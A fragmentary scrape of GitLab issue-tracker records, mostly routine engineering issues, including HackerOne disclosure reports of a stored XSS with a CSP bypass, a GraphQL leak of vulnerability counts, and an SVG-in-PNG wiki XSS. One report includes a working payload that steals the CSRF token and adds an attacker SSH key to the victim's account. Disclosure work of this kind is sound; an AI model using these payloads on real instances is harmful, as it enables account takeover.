[discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/31253#note_349833253):  (+1 comment)\n\n    \u003e @nfriend I know this is not part of the scope for this MR, but the spacing between the form elements in the **Links section** does not comply with the [Pajamas guidelines](https://design.gitlab.com/layout/spacing#standard-spacing-guidelines). \n    \u003e \n    \u003e Because `.row` is being used here, the padding/gutter applied is `15px` instead of `16px`. My suggestion is to remove the negative margins from `.row` and the horizontal padding from all immediate children columns by applying the `.no-gutters` class, and then apply the correct spacing modifiers to the form groups below.\n    \u003e \n    \u003e ```suggestion:-0+0\n    \u003e       class=\"row flex-column flex-sm-row align-items-stretch align-items-sm-start no-gutters\"\n    \u003e ```\n    \u003e \n    \u003e Feel free to follow up with a new MR!

XSS on the vulnerability page executing on gitlab.com","description":"**[HackerOne report #882988](https://hackerone.com/reports/882988)** by `xanbanx` on 2020-05-26, assigned to @vdesousa:\n\nHi GitLab Security Team,\n\n### Summary\n\nI found a stored XSS vulnerability in the standalone vulnerability page, which also executes on gitlab.com.\n\nGitLab recently added a standalone vulnerability page. This page allows to comment on vulnerabilities. Here, GitLab misses to escape the output leading to stored XSS vulnerability. Furthermore, with a CSP bypass, this XSS also triggers on gitlab.com.\n\n### Steps to reproduce\n\n1. Create new project  \n2. Setup SAST so that there is one vulnerability in the project. For this POC you can just push the following `gl-sast-report.json`\n\n```json  \n{\n    \"version\": \"1.2\",  \n    \"vulnerabilities\": [  \n        \n      {  \n        \"category\": \"sast\",  \n        \"name\": \"Predictable pseudorandom number generator\",  \n        \"message\": \"Predictable pseudorandom number generator\",  \n        \"cve\": \"groovy/src/main/java/com/gitlab/security_products/tests/App.groovy:47:PREDICTABLE_RANDOM\",  \n        \"severity\": \"High\",  \n        \"confidence\": \"Medium\",  \n        \"scanner\": {  \n          \"id\": \"find_sec_bugs\",  \n          \"name\": \"Find Security Bugs\"  \n        },  \n        \"location\": {  \n          \"file\": \"groovy/src/main/java/com/gitlab/security_products/tests/App.groovy\",  \n          \"start_line\": 47,  \n          \"end_line\": 47,  \n          \"class\": \"com.gitlab.security_products.tests.App\",  \n          \"method\": \"generateSecretToken2\"  \n        },  \n        \"identifiers\": [  \n          {  \n            \"type\": \"find_sec_bugs_type\",  \n            \"name\": \"Find Security Bugs-PREDICTABLE_RANDOM\",  \n            \"value\": \"PREDICTABLE_RANDOM\",  \n            \"url\": \"https://find-sec-bugs.github.io/bugs.htm#PREDICTABLE_RANDOM\"  \n          }  \n        ],  \n        \"priority\": \"Medium\",  \n        \"file\": \"groovy/src/main/java/com/gitlab/security_products/tests/App.groovy\",  \n        \"line\": 47,  \n        \"url\": \"https://find-sec-bugs.github.io/bugs.htm#PREDICTABLE_RANDOM\",  \n        \"tool\": \"find_sec_bugs\"  \n      }  \n    ]  \n}\n```\n\nand the following `gitlab-ci.yml` file:\n\n```yaml  \ntest:  \n  script:  \n    - echo \"Hello World\"  \n  artifacts:  \n    reports:  \n      sast: gl-sast-report.json  \n```\n\n3. This should create you a vulnerability, which is display on the Security Dashboard  \n4. Open the detail page of the vulnerability and change the status to `Confirmed`, this will enable the commen section below.  \n5. Enter the comment `\"\u003e\u003cimg src=x onerror=alert(document.domain)\u003e` and save it  \n6. When reloading the page, this will  trigger the XSS payload.\n\nThis example, uses a generic XSS payload, which is blocked on gitlab.com due to the deployed CSP.  \nHowever, I already reported a **CSP bypass** in #786753 and #824773, which can also be used here to let the XSS execute on gitlab.com  \nTo get to that, do the these additional steps.\n\n1. Add a file `test.svg` to the repository with the following content:\n\n```  \n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e  \n\u003csvg xmlns=\"http://www.w3.org/2000/svg\"  \n    version=\"1.1\" baseProfile=\"full\"  \n    width=\"700px\" height=\"400px\" viewBox=\"0 0 700 400\"\u003e  \n   \u003ccircle cx=\"125\" cy=\"125\" r=\"75\" /\u003e  \n   \u003cscript type=\"text/javascript\"\u003e  \n    alert(window.parent.document.domain)  \n   \u003c/script\u003e  \n\u003c/svg\u003e  \n``` \n\n2. Findout about the blob id by querying `https://gitlab.com/api/v4/projects/\u003cproject-id\u003e/repository/tree`. This returns the repo tree containing an blob id for the file `test.svg`like this one: `{\"id\":\"bbac0b4ac29d5bab841f60bdf71d7ea3b91ca87f\",\"name\":\"test.svg\",\"type\":\"blob\",\"path\":\"test.svg\",\"mode\":\"100644\"}`  \n3. Use the following XSS payload to comment on on the vulnerability: `\"\u003e\u003ciframe src='./../../../../../api/v4/projects/\u003cproject-id\u003e/repository/blobs/bbac0b4ac29d5bab841f60bdf71d7ea3b91ca87f/raw'\u003e` Don't forget to substitute the project id.\n\nAttached see a screenshot of the XSS executed on gitlab.com:\n\n[xss-vuln-page.png](https://h1.sec.gitlab.net/a/8ba28470-1022-420d-bc6f-7e6fb0ee0550/xss-vuln-page.png)\n\n### Impact\n\nThe stored XSS is triggering for any user with developer access and above for the project. The PoC can easily be extended to steal the users CSRF token and to takeover the victim's account. For example, you can use the following PoC to add the attackers SSH key to the victim's account:\n\n```  \n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e  \n\u003csvg xmlns=\"http://www.w3.org/2000/svg\"  \n    version=\"1.1\" baseProfile=\"full\"  \n    width=\"700px\" height=\"400px\" viewBox=\"0 0 700 400\"\u003e  \n   \u003ccircle cx=\"125\" cy=\"125\" r=\"75\" /\u003e  \n   \u003cscript type=\"text/javascript\"\u003e  \n    var csrf = window.parent.$('meta[name=csrf-token]').attr('content');   \n    window.parent.$.post('/profile/keys', { 'authenticity_token': csrf, 'key[key]': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUXhvMZ/BFqgVY4iWWv2lrs2alZHA6CoNcnZWH7gxObXGeFK89/itFbI8NrEDE291LRScBL1nuHs0xlf7uidf97uFGVMyIW8TKeaG/j5q6olr9ejiOZhiiGGkQZf1iSTV4VYN77EtG7iV62VB1ZbwnCau1xT5mlXbd8E4WzaHIxuOY8Ao8EozouaQzWt+I1xJx5rufVwItmTaX5QKV5Cuv8GhMRUb1UqujNKr22/rbWnut0pSzB1+uE4S4E1AaCNX9Byy0z65nzupk5kdj8y/qJ3pk8UBOgQtJCFEOwc42EHS3JwTeMRNRXs9bwqRJfXUomXL1LZ5Eua7UX7aQq7pf admin@foo.com', 'key[title]': 'admin@foo.com' });  \n   \u003c/script\u003e  \n\u003c/svg\u003e  \n``` \n\nDue to the CSP bypass, this XSS is also triggering on gitlab.com and also has full impact for self managed instances. \n\n### What is the current *bug* behavior?\n\nGitLab does not escape the comment of a vulnerability, thus allowing an XSS payload to execute.\n\n### What is the expected *correct* behavior?\n\nGitLab should escape the comments of a vulnerability.\n\n### Output of checks\n\nThis bug happens on GitLab.com running on \n\nBest regards,  \nXanbanx\n\n## Impact\n\nSee above.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [xss-vuln-page.png](https://h1.sec.gitlab.net/a/8ba28470-1022-420d-bc6f-7e6fb0ee0550/xss-vuln-page.png)","state":"closed","created_at":"2020-05-28T12:31:38.420Z","updated_at":"2021-07-14T17:07:24.111Z","closed_at":"2020-09-03T07:14:24.989Z","closed_by":{"id":5054702,"username":"vdesousa","name":"Vitor Meireles De Sousa","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f44d19f10d5b0c54a02e79c13812ff77?s=80\u0026d=identicon","web_url":"https://gitlab.com/vdesousa"},"labels":["Category:Vulnerability Management","Deliverable","HackerOne","backend","devops::secure","frontend","frontend-weight::2","group::threat insights","priority::3","section::sec","security","severity::3","workflow::verification"],"milestone":{"id":1233752,"iid":50,"group_id":9970,"title":"13.3","description":"https://about.gitlab.com/releases/2020/08/22/gitlab-13-3-released/","state":"closed","created_at":"2020-04-09T17:39:21.090Z","updated_at":"2022-04-13T14:50:18.976Z","due_date":"2020-08-17","start_date":"2020-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/50"},"assignees":[{"id":4906978,"username":"lkerr","name":"Lindsay Kerr","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906978/avatar.png","web_url":"https://gitlab.com/lkerr"},{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"}],"author":{"id":2741139,"username":"gitlab-securitybot","name":"GitLab SecurityBot","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2741139/avatar.png","web_url":"https://gitlab.com/gitlab-securitybot"},"type":"ISSUE","assignee":{"id":4906978,"username":"lkerr","name":"Lindsay Kerr","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906978/avatar.png","web_url":"https://gitlab.com/lkerr"},"user_notes_count":56,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":"2020-09-02","confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/219378","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/219378","notes":"https://gitlab.com/api/v4/projects/278964/issues/219378/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/219378/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#219378","relative":"#219378","full":"gitlab-org/gitlab#219378"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":35123046,"iid":219374,"project_id":278964,"title":"Deal with combinatorial explosion in the Event model","description":"The following discussion from !32700 should be addressed:\n\n- [ ] @dskim_gitlab started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/32700#note_350577275):  (+2 comments)\n\n    \u003e I wonder if we should consider creating separate classes for these and have clear interfaces to produce target specific information. :thinking: \n    \u003e \n    \u003e It seems that we have four types of targets as in Issue, MergeRequest, Note, and now additional Design.\n    \u003e \n    \u003e We handle things differently based on the target with lots of conditional logics.\n    \u003e \n    \u003e I wonder if we have a new plain old ruby class called something like `EventAction::Base` where we move most of constants and shared actions.

Considerations\n\nTwo possible implementations: read-optimize and write-optimize\n\n### Read-optimize\n\n```mermaid\ngraph LR\n  a[change] --\u003e b(\"Instance-level\") --\u003e c[\"bulk update\"] --\u003e d(\"Project-level\")\n```\nPros:\n- Less complex logic when inferring project-level setting\n\nCons:\n- Complex write logic with background job (e.g. schedule, retry)\n- Deal with potential race condition\n- Require audit tracking on individual project updates\n- Require extra triggers on other actions (e.g. when assign compliance labels)  \n\n### Write-optimize\n\n```mermaid\ngraph LR\n  a[read] --\u003e b(\"Project-level\") --\u003e c[query] --\u003e d(\"Instance-level\")\n```\nPros:\n- Simpler logic on instance-level update\n\nCons:\n- Complex read logic (i.e. need to query different tables to resolve the correct rules)\n- Might require application cache if queries are too expensive\n\nFor this proposal, I have decided to go with the write-optimize path given its complexity is less than the other. While I think this is a nice middle ground, the design around approval rules model and its complex cascading rules is overdue for a re-assessment. As we introduce more layer of checks upon our query path, the application performance suffers.\n\n## Open questions\n\n- MR Approvals Rules should be extracted to its own entity. This requires major overhaul across application and DB (`application_settings` and `projects` table).\n- Compliance is just a scope/container/namespace concept to approval rules. In theory, can we visualise this as directory tree?\n \n```\napplication\n|-- compliance\n|    |-- group \n|    |    |-- project\n|    |    |    |-- \n```\n\nPlaceholder, Issue description to come. \nSee comments history here. https://gitlab.com/groups/gitlab-org/-/epics/3432#note_350782501","state":"closed","created_at":"2020-05-28T09:35:26.303Z","updated_at":"2020-12-15T20:02:55.170Z","closed_at":"2020-07-10T17:22:19.151Z","closed_by":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"labels":["backend","devops::manage","group::compliance","missed:13.1","priority::1","type::feature","workflow::verification"],"milestone":{"id":1233746,"iid":49,"group_id":9970,"title":"13.2","description":"https://about.gitlab.com/releases/2020/07/22/gitlab-13-2-released/","state":"closed","created_at":"2020-04-09T17:28:01.032Z","updated_at":"2022-04-13T14:48:24.167Z","due_date":"2020-07-17","start_date":"2020-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/49"},"assignees":[{"id":398752,"username":"tancnle","name":"Tan Le","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/398752/avatar.png","web_url":"https://gitlab.com/tancnle"}],"author":{"id":4584545,"username":"dmoraBerlin","name":"Daniel Mora","state":"active","avatar_url":"https://secure.gravatar.com/avatar/0604ecfb7035e409af09d4a3b6d7dcb2?s=80\u0026d=identicon","web_url":"https://gitlab.com/dmoraBerlin"},"type":"ISSUE","assignee":{"id":398752,"username":"tancnle","name":"Tan Le","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/398752/avatar.png","web_url":"https://gitlab.com/tancnle"},"user_notes_count":12,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/219359","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/219359","notes":"https://gitlab.com/api/v4/projects/278964/issues/219359/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/219359/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#219359","relative":"#219359","full":"gitlab-org/gitlab#219359"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3432,"epic":{"id":59818,"iid":3432,"title":"Allow admins to scope admin-level MR approval settings to compliance-labeled projects","url":"/groups/gitlab-org/-/epics/3432","group_id":9970,"human_readable_end_date":"Nov 17, 2020","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":35103278,"iid":219348,"project_id":278964,"title":"Updating snippet file_name via API deletes snippet contents since 13.0.0","description":"### Summary\n\nUpdating snippet file_name via API deletes snippet contents since 13.0.0.\nYou can also see [this failing test in python-gitlab](https://travis-ci.org/github/python-gitlab/python-gitlab/jobs/690807595#L368), because the content is empty after renaming\n\n### Steps to reproduce\n\n1.

If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n--\u003e\n\nThis change applies to anyone who would review MRs. \nI think it's the following personas.\n\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager) \n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops) \n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n\n### User experience goal\n\n\u003c!-- What is the single user experience workflow this problem addresses? \nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e \n\nThe user should be able to toggle this setting once and have it apply to all MRs they review. \n\n\n### Proposal\n\n\u003c!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey --\u003e\n\nSet it and forget it. \n\n### Further details\n\nIncluding some of the details from the original Slack thread, @andr3 writes:\n\u003e This setting is not saved on a cookie. It‚Äôs saved on localStorage, which does not get sent to the server inherently like cookies.\nlocalStorage.getItem('mr_show_whitespace') in the console will give you the state.\nOnce you click on it, it‚Äôs set on the url with ?w=1 or ?w=0. If you reload, the setting will persist. If you load the URL of the MR from scratch / follow a link, the setting will be lost.\nI think this to be a bug... I believe the intention is to have it persist. But we‚Äôre not sending the option from localStorage with the AJAX requests to the server.\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?--\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What¬†is¬†the¬†buyer¬†persona¬†for¬†this¬†feature?¬†See¬†https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e\n\n### Links / references","state":"closed","created_at":"2020-05-28T00:16:04.182Z","updated_at":"2020-12-07T16:46:35.969Z","closed_at":"2020-07-09T18:51:17.921Z","closed_by":{"id":4017300,"username":"jboyson","name":"Justin Boyson","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4017300/avatar.png","web_url":"https://gitlab.com/jboyson"},"labels":["Category:Code Review Workflow","Deliverable","devops::create","frontend","group::code review","merge requests","priority::2","severity::3","type::bug","workflow::canary"],"milestone":{"id":1233746,"iid":49,"group_id":9970,"title":"13.2","description":"https://about.gitlab.com/releases/2020/07/22/gitlab-13-2-released/","state":"closed","created_at":"2020-04-09T17:28:01.032Z","updated_at":"2022-04-13T14:48:24.167Z","due_date":"2020-07-17","start_date":"2020-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/49"},"assignees":[{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"},{"id":4017300,"username":"jboyson","name":"Justin Boyson","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4017300/avatar.png","web_url":"https://gitlab.com/jboyson"}],"author":{"id":2295562,"username":"emilie","name":"Emilie Schario","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2295562/avatar.png","web_url":"https://gitlab.com/emilie"},"type":"ISSUE","assignee":{"id":626804,"username":"pedroms","name":"Pedro Moreira da Silva","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c306f087d191ac15549f3c11e3bed321?s=80\u0026d=identicon","web_url":"https://gitlab.com/pedroms"},"user_notes_count":3,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/219325","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/219325","notes":"https://gitlab.com/api/v4/projects/278964/issues/219325/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/219325/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#219325","relative":"#219325","full":"gitlab-org/gitlab#219325"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":35091733,"iid":219315,"project_id":278964,"title":"Geo - Support Parameterized Route/Controller/View","description":"## What/Why\n\nRelated to https://gitlab.com/gitlab-org/gitlab/-/issues/216969\u003cbr /\u003e\nFollow up from https://gitlab.com/gitlab-org/gitlab/-/merge_requests/32872\n\n**Views in question:**\n![Screen_Shot_2020-05-27_at_4.01.54_PM](/uploads/53cc58faffd4fb2dfdb2b44da5073868/Screen_Shot_2020-05-27_at_4.01.54_PM.png)\n\nCurrently, when we add a new Replicable Type to the Geo ~frontend  we have to manually add:\n\n1.

leaks numbers of vulnerabilities to unauthorized users","description":"**[HackerOne report #880944](https://hackerone.com/reports/880944)** by `xanbanx` on 2020-05-22, assigned to @vdesousa:\n\nHi GitLab Security Team,\n\n### Summary\n\nGitLab recently implemented a new GraphQL API to list all vulnerabilities (SAST, DAST,...).  \nA smaller API just returns the counts of unfixed vulnerabilities.  \nThis API, however, is missing permission checks. So anyone, who has access to the project, i.e., anyone to a public project, can read the numbers of unfixed vulnerabilities. I think this one is one of the rare cases where numbers leaking are in scope of the H1 policy, and I also provide a git patch fixing the issue :D\n\n### Steps to reproduce\n\n1. Create a public project, e.g., named `test-vulnerabilities`, and enable GitLab CI  \n2. Add the attached `gl-sast-report.json` file to the root directory of the repository  \n2. Add the following `.gitlab-ci.yml` file to the repository\n\n```yaml  \ntest:  \n  script:  \n    - echo \"Hello World\"  \n  artifacts:  \n    reports:  \n      sast: gl-sast-report.json\n\n```\n\n4. As an unauthenticated user, visit `https://gitlab.example.com/-/graphql-explorer` and perform the following graphql query:\n\n```  \n{\n  project(fullPath:\"root/test-vulnerabilities\") {  \n    name  \n    vulnerabilitySeveritiesCount {  \n      critical  \n      high  \n      medium  \n      low  \n      info  \n      unknown  \n    }  \n  }  \n}\n```\n\nThis now returns the number of unfixed vulnerabilities for all severities.\n\n```json  \n{\n  \"data\": {  \n    \"currentUser\": null,  \n    \"project\": {  \n      \"name\": \"test-vulnerabilities\",  \n      \"vulnerabilitySeveritiesCount\": {  \n        \"critical\": 1,  \n        \"high\": 1,  \n        \"medium\": 10,  \n        \"low\": 17,  \n        \"info\": 0,  \n        \"unknown\": 4  \n      }  \n    }  \n  }  \n}\n```\n\nIn the example above, I used a public project and an unauthenticated user.   \nThe vulnerability however exists also in other permission models, e.g., private project and guest user,...\n\nThe same query also works on the `gitlab-org/gitlab` repository, which returns the following vulnerability counts for an unauthenticated user:\n\n```json  \n{\n  \"data\": {  \n    \"project\": {  \n      \"name\": \"GitLab\",  \n      \"vulnerabilitySeveritiesCount\": {  \n        \"critical\": 1,  \n        \"high\": 2,  \n        \"medium\": 3,  \n        \"low\": 1,  \n        \"info\": 0,  \n        \"unknown\": 2302  \n      }  \n    }  \n  }  \n}\n```\n\n### Impact\n\nGraphql API leaks the number of unfixed vulnerabilities to unauthorized users. Since this is leaking that there are unfixed vulnerabilities, e.g., a critical one, I think this report about *numbers* is in scope of GitLab's H1 policy.\n\n### What is the current *bug* behavior?\n\nGraphql API leaks the number of unfixed vulnerabilities to unauthorized.\n\n### What is the expected *correct* behavior?\n\nGraphql only returns the number of unfixed vulnerabilities if  the user has access to view vulnerabilities.\n\nI think the fix for that is pretty simple. The GraphQL vulnerability count type is missing a permission check.   \nI think the following patch should fix that.\n\n```diff  \nFrom e6258f63f252eb773d864964019573f41c174309 Mon Sep 17 00:00:00

This tool has some awkward versioning and isn't as flexible as others for versioning java versions. We should consider switching to `asdf` and [`asdf-java`](https://github.com/halcyon/asdf-java).\n\n`asdf` also allows us to standardize on a versioning tool across all our images, which should make global changes easier.\n\n### Intended users\n\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n\n### User experience goal\n\nClearer version tracking, more predicatble pipelines, pinning to precise versions\n\n### Proposal\n\nSwitch from https://sdkman.io to `asdf` within spotbugs build image\n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?--\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!-- Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this. --\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What¬†is¬†the¬†buyer¬†persona¬†for¬†this¬†feature?¬†See¬†https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e\n\n### Links / references\n\n### Implementation plan\n\nReplace sdkman functionality with `asdf`.

i can upload png file with JavaScript code and execute it in wiki page.\n\n### Steps to reproduce\n\n(Step-by-step guide to reproduce the issue, including:)\n\n1-login to gitlab account  \n2-open  your project  \n3-open Wiki page.  \n4-Click \"New page\" button.  \n5-attach png file which contain below code  \n `\u003c?xml version=\"1.0\" standalone=\"no\"?\u003e\u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e\u003csvg onload=\"alert(1)\" xmlns=\"http://www.w3.org/2000/svg\"\u003e  \n\u003cpolygon id=\"triangle\"

first time just click on it one more time \n\n\n\n### Impact\n\nIf wiki pages created by using this vulnerability are visible to everyone (Wiki Visibility setting is set to \"Everyone With Access\") in \"Public\" project, there is a possibility that a considerable number of GitLab users and visitors click a malicious link.\n\n### Examples  \ngitlab.com\n\ntested on Google Chrome\n\nhttps://gitlab.com/semsemhacker123/semsemtest/-/wikis/ssaa-home  \nhttps://gitlab.com/semsemhacker123/semsemtest/-/wikis/uploads/1308853a75502f77b3e22a2f9b0cc88a/1111111.png\n\n### What is the current *bug* behavior?\n\nThe alert dialog appears after clicking \"green triangle \" in created page.\n\n### What is the expected *correct* behavior?\n\nthe png file it must be not executed as  `image/svg+xml`\n\n## Impact\n\nAn attacker can use XSS to send a malicious script to an unsuspecting user. The end user‚Äôs browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n*
